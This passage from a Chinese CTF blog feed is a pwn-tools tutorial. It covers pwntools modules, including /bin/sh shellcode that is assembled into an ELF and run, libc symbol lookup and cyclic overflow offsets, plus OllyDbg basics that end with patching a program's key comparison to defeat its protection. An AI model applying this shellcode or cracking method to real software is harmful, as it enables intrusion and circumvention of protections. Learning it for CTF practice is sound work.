xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    shellcraft.sh()</span><br></pre></td></tr></table></figure><h4 id="asm">asm</h4><p>该模块用于汇编和反汇编代码。</p><p>体系结构，端序和字长需要在 <code>asm()</code> 和 <code>disasm()</code> 中设置，但为了避免重复，运行时变量最好使用 <code>pwnlib.context</code> 来设置。</p><p>汇编：(<code>pwnlib.asm.asm</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; asm(&apos;nop&apos;)</span><br><span class="line">&apos;\x90&apos;</span><br><span class="line">&gt;&gt;&gt; asm(shellcraft.nop())</span><br><span class="line">&apos;\x90&apos;</span><br><span class="line">&gt;&gt;&gt; asm(&apos;nop&apos;, arch=&apos;arm&apos;)</span><br><span class="line">&apos;\x00\xf0 \xe3&apos;</span><br><span class="line">&gt;&gt;&gt; context.arch = &apos;arm&apos;</span><br><span class="line">&gt;&gt;&gt; context.os = &apos;linux&apos;</span><br><span class="line">&gt;&gt;&gt; context.endian = &apos;little&apos;</span><br><span class="line">&gt;&gt;&gt; context.word_size = 32</span><br><span class="line">&gt;&gt;&gt; context</span><br><span class="line">ContextType(arch = &apos;arm&apos;, bits = 32, endian = &apos;little&apos;, os = &apos;linux&apos;)</span><br><span class="line">&gt;&gt;&gt; asm(&apos;nop&apos;)</span><br><span class="line">&apos;\x00\xf0 \xe3&apos;</span><br><span class="line">&gt;&gt;&gt; asm(&apos;mov eax, 1&apos;)</span><br><span class="line">&apos;\xb8\x01\x00\x00\x00&apos;</span><br><span class="line">&gt;&gt;&gt; asm(&apos;mov eax, 1&apos;).encode(&apos;hex&apos;)</span><br><span class="line">&apos;b801000000&apos;</span><br></pre></td></tr></table></figure><p>请注意，这里我们生成了 i386 和 arm 两种不同体系结构的 <code>nop</code>，当你使用不同与本机平台的汇编时，需要安装该平台的 binutils，方法在上面已经介绍过了。</p><p>反汇编：(<code>pwnlib.asm.disasm</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print disasm(&apos;\xb8\x01\x00\x00\x00&apos;)</span><br><span class="line">   0:   b8 01 00 00 00          mov    eax,0x1</span><br><span class="line">&gt;&gt;&gt; print disasm(&apos;6a0258cd80ebf9&apos;.decode(&apos;hex&apos;))</span><br><span class="line">   0:   6a 02                   push   0x2</span><br><span class="line">   2:   58                      pop    eax</span><br><span class="line">   3:   cd 80                   int    0x80</span><br><span class="line">   5:   eb f9                   jmp    0x0</span><br></pre></td></tr></table></figure><p>构建具有指定二进制数据的 ELF 文件：(<code>pwnlib.asm.make_elf</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; context.clear(arch=&apos;amd64&apos;)</span><br><span class="line">&gt;&gt;&gt; context</span><br><span class="line">ContextType(arch = &apos;amd64&apos;, bits = 64, endian = &apos;little&apos;)</span><br><span class="line">&gt;&gt;&gt; bin_sh = asm(shellcraft.amd64.linux.sh())</span><br><span class="line">&gt;&gt;&gt; bin_sh</span><br><span class="line">&apos;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&apos;</span><br><span class="line">&gt;&gt;&gt; filename = make_elf(bin_sh, extract=False)</span><br><span class="line">&gt;&gt;&gt; filename</span><br><span class="line">&apos;/tmp/pwn-asm-V4GWGN/step3-elf&apos;</span><br><span class="line">&gt;&gt;&gt; p = process(filename)</span><br><span class="line">[x] Starting local process &apos;/tmp/pwn-asm-V4GWGN/step3-elf&apos;</span><br><span class="line">[+] Starting local process &apos;/tmp/pwn-asm-V4GWGN/step3-elf&apos;: pid 28323</span><br><span class="line">&gt;&gt;&gt; p.sendline(&apos;echo hello&apos;)</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">&apos;hello\n&apos;</span><br></pre></td></tr></table></figure><p>这里我们生成了 amd64，即 64 位 <code>/bin/sh</code> 的 shellcode，配合上 asm 函数，即可通过 <code>make_elf</code> 得到 ELF 文件。</p><p>另一个函数 <code>pwnlib.asm.make_elf_from_assembly</code> 允许你构建具有指定汇编代码的 ELF 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; asm_sh = shellcraft.amd64.linux.sh()</span><br><span class="line">&gt;&gt;&gt; print asm_sh</span><br><span class="line">    /* execve(path=&apos;/bin///sh&apos;, argv=[&apos;sh&apos;], envp=0) */</span><br><span class="line">    /* push &apos;/bin///sh\x00&apos; */</span><br><span class="line">    push 0x68</span><br><span class="line">    mov rax, 0x732f2f2f6e69622f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [&apos;sh\x00&apos;] */</span><br><span class="line">    /* push &apos;sh\x00&apos; */</span><br><span class="line">    push 0x1010101 ^ 0x6873</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push 8</span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* &apos;sh\x00&apos; */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; filename = make_elf_from_assembly(asm_sh)</span><br><span class="line">&gt;&gt;&gt; filename</span><br><span class="line">&apos;/tmp/pwn-asm-ApZ4_p/step3&apos;</span><br><span class="line">&gt;&gt;&gt; p = process(filename)</span><br><span class="line">[x] Starting local process &apos;/tmp/pwn-asm-ApZ4_p/step3&apos;</span><br><span class="line">[+] Starting local process &apos;/tmp/pwn-asm-ApZ4_p/step3&apos;: pid 28429</span><br><span class="line">&gt;&gt;&gt; p.sendline(&apos;echo hello&apos;)</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">&apos;hello\n&apos;</span><br></pre></td></tr></table></figure><p>与上一个函数不同的是，<code>make_elf_from_assembly</code> 直接从汇编生成 ELF 文件，并且保留了所有的符号，例如标签和局部变量等。</p><h4 id="elf">elf</h4><p>该模块用于 ELF 二进制文件的操作，包括符号查找、虚拟内存、文件偏移，以及修改和保存二进制文件等功能。(<code>pwnlib.elf.elf.ELF</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">[*] &apos;/bin/cat&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;])</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got[&apos;write&apos;])</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;])</span><br><span class="line">0x401680</span><br></pre></td></tr></table></figure><p>上面的代码分别获得了 ELF 文件装载的基地址、函数地址、GOT 表地址和 PLT 表地址。</p><p>我们常常用它打开一个 libc.so，从而得到 system 函数的位置，这在 CTF 中是非常有用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/usr/lib/libc.so.6&apos;)</span><br><span class="line">[*] &apos;/usr/lib/libc.so.6&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&apos;system&apos;])</span><br><span class="line">0x42010</span><br></pre></td></tr></table></figure><p>我们甚至可以修改 ELF 文件的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt;&gt;&gt; e.read(e.address+1, 3)</span><br><span class="line">&apos;ELF&apos;</span><br><span class="line">&gt;&gt;&gt; e.asm(e.address, &apos;ret&apos;)</span><br><span class="line">&gt;&gt;&gt; e.save(&apos;/tmp/quiet-cat&apos;)</span><br><span class="line">&gt;&gt;&gt; disasm(file(&apos;/tmp/quiet-cat&apos;,&apos;rb&apos;).read(1))</span><br><span class="line">&apos;   0:   c3                      ret&apos;</span><br></pre></td></tr></table></figure><p>下面是一些常用函数：</p><ul><li><code>asm(address, assembly)</code>：汇编指定指令并插入到 ELF 的指定地址处，需要使用 ELF.save() 保存</li><li><code>bss(offset)</code>：返回 <code>.bss</code> 段加上 <code>offset</code> 后的地址</li><li><code>checksec()</code>：打印出文件使用的安全保护</li><li><code>disable_nx()</code>：关闭 NX</li><li><code>disasm(address, n_bytes)</code>：返回对指定虚拟地址进行反汇编后的字符串</li><li><code>offset_to_vaddr(offset)</code>：将指定偏移转换为虚拟地址</li><li><code>vaddr_to_offset(address)</code>：将指定虚拟地址转换为文件偏移</li><li><code>read(address, count)</code>：从指定虚拟地址读取 <code>count</code> 个字节的数据</li><li><code>write(address, data)</code>：在指定虚拟地址处写入 <code>data</code></li><li><code>section(name)</code>：获取 <code>name</code> 段的数据</li><li><code>debug()</code>：使用 <code>gdb.debug()</code> 进行调试</li></ul><p>最后还要注意一下 <code>pwnlib.elf.corefile</code>，它用于处理核心转储文件（Core Dump），当我们在写利用代码时，核心转储文件是非常有用的，关于它更详细的内容已经在前面 Linux基础一章中讲过，这里我们还是使用那一章中的示例代码，但使用 pwntools 来操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; core = Corefile(&apos;/tmp/core-a.out-30555-1507796886&apos;)</span><br><span class="line">[x] Parsing corefile...</span><br><span class="line">[*] &apos;/tmp/core-a.out-30555-1507796886&apos;</span><br><span class="line">    Arch:      i386-32-little</span><br><span class="line">    EIP:       0x565cd57b</span><br><span class="line">    ESP:       0x4141413d</span><br><span class="line">    Exe:       &apos;/home/firmy/a.out&apos; (0x565cd000)</span><br><span class="line">    Fault:     0x4141413d</span><br><span class="line">[+] Parsing corefile...: Done</span><br><span class="line">&gt;&gt;&gt; core.registers</span><br><span class="line">&#123;&apos;xds&apos;: 43, &apos;eip&apos;: 1448924539, &apos;xss&apos;: 43, &apos;esp&apos;: 1094795581, &apos;xgs&apos;: 99, &apos;edi&apos;: 0, &apos;orig_eax&apos;: 4294967295, &apos;xcs&apos;: 35, &apos;eax&apos;: 1, &apos;ebp&apos;: 1094795585, &apos;xes&apos;: 43, &apos;eflags&apos;: 66182, &apos;edx&apos;: 4151195744, &apos;ebx&apos;: 1094795585, &apos;xfs&apos;: 0, &apos;esi&apos;: 4151189032, &apos;ecx&apos;: 1094795585&#125;</span><br><span class="line">&gt;&gt;&gt; print core.maps</span><br><span class="line">565cd000-565ce000 r-xp 1000 /home/firmy/a.out</span><br><span class="line">565ce000-565cf000 r--p 1000 /home/firmy/a.out</span><br><span class="line">565cf000-565d0000 rw-p 1000 /home/firmy/a.out</span><br><span class="line">57b3c000-57b5e000 rw-p 22000</span><br><span class="line">f7510000-f76df000 r-xp 1cf000 /usr/lib32/libc-2.26.so</span><br><span class="line">f76df000-f76e0000 ---p 1000 /usr/lib32/libc-2.26.so</span><br><span class="line">f76e0000-f76e2000 r--p 2000 /usr/lib32/libc-2.26.so</span><br><span class="line">f76e2000-f76e3000 rw-p 1000 /usr/lib32/libc-2.26.so</span><br><span class="line">f76e3000-f76e6000 rw-p 3000</span><br><span class="line">f7722000-f7724000 rw-p 2000</span><br><span class="line">f7724000-f7726000 r--p 2000 [vvar]</span><br><span class="line">f7726000-f7728000 r-xp 2000 [vdso]</span><br><span class="line">f7728000-f774d000 r-xp 25000 /usr/lib32/ld-2.26.so</span><br><span class="line">f774d000-f774e000 r--p 1000 /usr/lib32/ld-2.26.so</span><br><span class="line">f774e000-f774f000 rw-p 1000 /usr/lib32/ld-2.26.so</span><br><span class="line">ffe37000-ffe58000 rw-p 21000 [stack]</span><br><span class="line">&gt;&gt;&gt; print hex(core.fault_addr)</span><br><span class="line">0x4141413d</span><br><span class="line">&gt;&gt;&gt; print hex(core.pc)</span><br><span class="line">0x565cd57b</span><br><span class="line">&gt;&gt;&gt; print core.libc</span><br><span class="line">f7510000-f76df000 r-xp 1cf000 /usr/lib32/libc-2.26.so</span><br></pre></td></tr></table></figure><h4 id="dynelf">dynelf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.dynelf.DynELF</span><br></pre></td></tr></table></figure><p>该模块是专门用来应对无 libc 情况下的漏洞利用。它首先找到 glibc 的基地址，然后使用符号表和字符串表对所有符号进行解析，直到找到我们需要的函数的符号。</p><h4 id="fmtstr">fmtstr</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.fmtstr.FmtStr`，`pwnlib.fmtstr.fmtstr_payload</span><br></pre></td></tr></table></figure><p>该模块用于格式化字符串漏洞的利用，格式化字符串漏洞是 CTF 中一种常见的题型，我们会在后面的章节中详细讲述，关于该模块的使用也会留到那儿。</p><h4 id="gdb">gdb</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.gdb</span><br></pre></td></tr></table></figure><p>在写漏洞利用的时候，常常需要使用 gdb 动态调试，该模块就提供了这方面的支持。</p><p>两个常用函数：</p><ul><li><code>gdb.attach(target, gdbscript=None)</code>：在一个新终端打开 gdb 并 attach 到指定 PID 的进程，或是一个 <code>pwnlib.tubes</code> 对象。</li><li><code>gdb.debug(args, gdbscript=None)</code>：在新终端中使用 gdb 加载一个二进制文件。</li></ul><p>上面两种方法都可以在开启的时候传递一个脚本到 gdb，可以很方便地做一些操作，如自动设置断点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attach to pid 1234</span></span><br><span class="line">gdb.attach(<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># attach to a process</span></span><br><span class="line">bash = process(<span class="string">'bash'</span>)</span><br><span class="line">gdb.attach(bash, <span class="string">'''</span></span><br><span class="line"><span class="string">set follow-fork-mode child</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">bash.sendline(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment"># Create a new process, and stop it at 'main'</span></span><br><span class="line">io = gdb.debug(<span class="string">'bash'</span>, <span class="string">'''</span></span><br><span class="line"><span class="string"># Wait until we hit the main executable's entry point</span></span><br><span class="line"><span class="string">break _start</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Now set breakpoint on shared library routines</span></span><br><span class="line"><span class="string">break malloc</span></span><br><span class="line"><span class="string">break free</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">'''</span>)</span><br></pre></td></tr></table></figure><h4 id="memleak">memleak</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.memleak</span><br></pre></td></tr></table></figure><p>该模块用于内存泄露的利用。可用作装饰器。它会将泄露的内存缓存起来，在漏洞利用过程中可能会用到。</p><h4 id="util">util</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.util.packing`, `pwnlib.util.cyclic</span><br></pre></td></tr></table></figure><p>util 其实是一些模块的集合，包含了一些实用的小工具。这里主要介绍两个，packing 和 cyclic。</p><p>packing 模块用于将整数打包和解包，它简化了标准库中的 <code>struct.pack</code> 和 <code>struct.unpack</code> 函数，同时增加了对任意宽度整数的支持。</p><p>使用 <code>p32</code>, <code>p64</code>, <code>u32</code>, <code>u64</code> 函数分别对 32 位和 64 位整数打包和解包，也可以使用 <code>pack()</code> 自己定义长度，另外添加参数 <code>endian</code> 和 <code>signed</code> 设置端序和是否带符号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p32(0xdeadbeef)</span><br><span class="line">&apos;\xef\xbe\xad\xde&apos;</span><br><span class="line">&gt;&gt;&gt; p64(0xdeadbeef).encode(&apos;hex&apos;)</span><br><span class="line">&apos;efbeadde00000000&apos;</span><br><span class="line">&gt;&gt;&gt; p32(0xdeadbeef, endian=&apos;big&apos;, sign=&apos;unsigned&apos;)</span><br><span class="line">&apos;\xde\xad\xbe\xef&apos;</span><br><span class="line">&gt;&gt;&gt; u32(&apos;1234&apos;)</span><br><span class="line">875770417</span><br><span class="line">&gt;&gt;&gt; u32(&apos;1234&apos;, endian=&apos;big&apos;, sign=&apos;signed&apos;)</span><br><span class="line">825373492</span><br><span class="line">&gt;&gt;&gt; u32(&apos;\xef\xbe\xad\xde&apos;)</span><br><span class="line">3735928559</span><br></pre></td></tr></table></figure><p>cyclic 模块在缓冲区溢出中很有用，它帮助生成模式字符串，然后查找偏移，以确定返回地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; cyclic(20)</span><br><span class="line">&apos;aaaabaaacaaadaaaeaaa&apos;</span><br><span class="line">&gt;&gt;&gt; cyclic_find(0x61616162)</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="x34-pwntools-在-ctf-中的运用">0x34 Pwntools 在 CTF 中的运用</h3><p>可以在下面的仓库中找到大量使用 pwntools 的 write-up： <a href="https://github.com/Gallopsled/pwntools-write-ups" target="_blank" rel="noopener">pwntools-write-ups</a></p><hr><h2 id="x40-ollydbg">0x40 OllyDbg</h2><h3 id="x41-ollydbg调试器基本操作">0x41 OllyDbg调试器基本操作</h3><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/1543165695976.png" alt="OD界面介绍"><figcaption>OD界面介绍</figcaption></figure></div><h4 id="加载程序">① 加载程序</h4><ol type="1"><li>加载程序：OllyDbg可以用两种方式加载目标程序进行调试，一种是通过<strong>CreateProcess创建进程</strong>；另外一种是利用<code>DebugActiveProcess</code>函数将调试器<strong>捆绑到一个正在运行的进程上</strong>。 2.利用CreateProcess创建进程：单击菜单“File/Open”或者<strong>按快捷键F3</strong>打开目标文件，这样会调用<code>CreateProcess</code>创建一个用以调试的进进程。OllyDbg将接收目标进程发送的调试事件，并对相应的对调试事件进行处理。</li><li>OllyDbg除了直接加载目标程序，也支持带参数的程序，方法是：在打开对话框中的“Arguments”栏中输入参数。如下图所示：<div style="text-align: center;"><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/1543164648498.png" title="fig:" alt="1543164648498"></div></li></ol><ol start="5" type="1"><li><strong>将OllyDbg附加到一个正在运行的进程</strong>：OllyDbg一个实用的功能是可以调试正在运行的程序，这个功能称为”附加（Attach）“。其原理是利用<code>DebugActiveProcess</code>函数将调试器捆绑到一个正在运行的进程上，如果执行成功，则类似利用<code>CreateProcess</code>创建新进程。</li><li>单击菜单”File/Attach“打开<strong>附加对话框</strong>。选择正在运行的目标进程，单击Attach按钮即可附加到目标进程。附加后，目标程序会暂停在Ntdll.dll中的DbgBreakPoint处，按下<strong>F9或者shift+F9</strong>就可以让程序继续运行。接着对目标程序进行调试分析。</li><li>如果进程是隐藏的，OllyDbg有一个<code>-p</code>启动参数，只要得到进程的pid就可以附加了。可以利用IceSword等工具获得隐藏进程的PID，然后在控制台下用 -p 参数附加即可。注意，<strong>pid的值是十进制</strong></li><li><strong>单步跟踪</strong>：调试器一个最基本的功能就是动态跟踪，OllyDbg在菜单“Debug”里有控制运行的命令，各个菜单项有对应的快捷键。</li></ol><table><thead><tr class="header"><th>OllyDbg功能键</th><th>功能</th></tr></thead><tbody><tr class="odd"><td>F7</td><td>单步步进，遇到Call跟进</td></tr><tr class="even"><td>F8</td><td>单步步过，遇到CALL跳过，不跟进</td></tr><tr class="odd"><td>Ctrl+F9</td><td>直到出现RET指令时中断</td></tr><tr class="even"><td>Alt+F9</td><td>若进入系统领空，此命令可以回到应用程序领空。</td></tr><tr class="odd"><td>F9</td><td>运行程序</td></tr></tbody></table><ol start="9" type="1"><li><p>F8键在调试中用的很频繁，可以一句句地<strong>单步执行</strong>汇编指令，<strong>遇到CALL指令不会跟进</strong>，而是路过。而F7的差别就主要在于，遇到CALL、LOOP等指令是<strong>会跟进去</strong>。</p></li><li><p>如果是<strong>重复多次调用F7或者F8</strong>时，OllyDbg提供了<strong>“Ctrl+F7”和“Ctrl+F8”</strong>快捷键，直到按下<strong>Esc键、F12键</strong>或者遇到断点时停止。</p></li><li><p>当<strong>位于某个CALL</strong>中，想回到调用这个CALL的地方时，可以按下<strong>“Ctrl+F9”</strong>快捷键，执行“执行到返回（Execute till return）”功能。OllyDbg就会停在<strong>遇到的第一个返回命令</strong>（RET、RETF或者IRET。可以设置为停在刚执行完RET等的位置）.</p></li><li><p>而如果<strong>跟进系统DLL提供的API函数</strong>中，此时想<strong>返回到应用程序领空里</strong>，可以按快捷键<strong>“Alt+F9”</strong>执行<strong>“Execute till user code”</strong>(执行到用户代码)命令。</p></li></ol><h4 id="设置断点">② 设置断点</h4><ol type="1"><li><strong>设置断点</strong>：断点是调试器的一个<strong>重要功能</strong>，可以<strong>让程序中断在需要的地方</strong>，从而方便分析。最常用的断点是INT3断点，其原理是OllyDbg将断点地址处代码修改为INT3 指令。设置断点的<strong>快捷键是F2</strong>，<strong>再按一次F2取消断点</strong>；也可以用鼠标双击“Hex dump”列来设置断点。</li><li><strong>调试分析</strong>：字符串通常利用<strong>Window文件框输入</strong>。为了检查输入字符，程序通常采用下面的函数将文本框中的内容读取出来。</li></ol><table><thead><tr class="header"><th>字符串读取函数</th><th>32位（ANSI版本）</th><th>32位（Unicode版本）</th></tr></thead><tbody><tr class="odd"><td>GetDlgItemText</td><td>GetDlgItemTextA</td><td>GetDlgItemTextW</td></tr><tr class="even"><td>GetWindowText</td><td>GetWindowTextA</td><td>GetWindowTextW</td></tr></tbody></table><ol start="3" type="1"><li><p>一般情况下事先不知道程序具体会调用什么函数来取字符串，只好多试几次（经验比较重要）</p></li><li><p>还可以<strong>利用输入表设置断点</strong>。在OllyDbg中，按下<strong>"Ctrl+N"</strong>这个快捷键打开应用程序输入表，会发现应用程序调用的其他模块的导出函数，找到相应的函数后，通过Enter键即可切换到相应的代码，<strong>接下来按F2设置断点</strong>。</p></li><li><p>另一种方法：使用<strong>“Ctrl+G“</strong>键打开<strong>跟随表达式</strong>的窗口，输入GetDlgItemTextA字符串，单击OK按钮，会来到GetDlgItemTextA函数入口处，在0x77D6AC1E处下断点.</p></li><li><p>在阅读代码时：</p></li></ol><ul><li>要搞清楚<strong>各个API函数的定义</strong>（查看相关API手册）。</li><li>API函数基本采用的是**_stdcall调用约定<strong>，即函数入口参数按</strong>从右到左<strong>的顺序入栈，</strong>由被调用者清理栈中参数，返回值放在eax中**。因此，对相关的API函数要分析其前的push指令，这些指令将参数放进堆栈以供API调用。整个过程要关注堆栈的变化。</li><li>C代码中的子程序采用的是C调用约定，参数入口按照从右到左的顺序入栈，由调用者清理栈总参数。</li></ul><h4 id="找关键比较">③ 找关键比较</h4><ul><li><strong>找到关键比较位置</strong>：程序在进行验证时，一般会在关键位置进行比较，如果验证通过，则程序会跳转到正确的流程；如果程序验证不通过，则会跳转到错误的流程执行，在进行破解时一般只要找到比较的关键位置，将<strong>代码修改后然后保存</strong>到文件中即可完成对程序的暴力破解。</li><li>目前修改的是内存中的数据，为了使修改一直有效，就必须将这个变化写进磁盘文件中。</li><li><strong>保存方法</strong>：用鼠标<strong>选中修改过的代码</strong>，单击鼠标右键，执行“Copy to excutable/Selection”命令，将打开<strong>文件编辑窗口</strong>，单击鼠标右键，执行命令<strong>“Save File ”</strong>即可将修改保存到文件中。</li><li>像这种通过修改文件然后屏蔽程序某些功能或改变程序流程，使程序保护方法失效的方法称为<strong>patch(补丁)或“爆破”</strong></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;x00-简介&quot;&gt;0x00 简介&lt;/h2&gt;
&lt;p&gt;本章介绍在CTF PWN中常用工具的使用及其快捷键，尽量用最短的学习时间快速入门这些工具的使用。随着工具的增多以及其功能的丰富，本章会不定期更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
      <category term="Tools" scheme="http://www.killshadow.xyz/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>隐写术(四)--总结</title>
    <link href="http://www.killshadow.xyz/2019/06/06/%E9%9A%90%E5%86%99%E6%9C%AF(%E5%9B%9B)--CTF%E6%80%BB%E7%BB%93/"/>
    <id>http://www.killshadow.xyz/2019/06/06/隐写术(四)--CTF总结/</id>
    <published>2019-06-06T02:10:00.000Z</published>
    <updated>2019-06-06T02:24:52.175Z</updated>
    
